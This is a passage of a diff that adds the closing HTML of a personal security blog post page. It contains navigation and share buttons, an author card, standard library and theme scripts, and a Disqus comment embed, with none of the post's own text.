+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+    
+    <h4 id="about-card-name">Zor01478</h4>
+    
+      <div id="about-card-bio">戴了头盔，所以头很铁</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Sec
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        杭州
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    <div id="cover" style="background-image:url('https://gitee.com/zor01478/blog-picture/raw/master/images/qianyang.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://Zor01478.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://Zor01478.github.io/js/clicklove.js"></script>
+  
+
+  
+    <script src="https://Zor01478.github.io/js/snow.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/Zor01478.github.io\/2021\/02\/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8B%E7%AF%87\/';
+          
+            this.page.identifier = '\/2021\/02\/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8B%E7%AF%87\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'hugo-tranquilpeak-theme';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
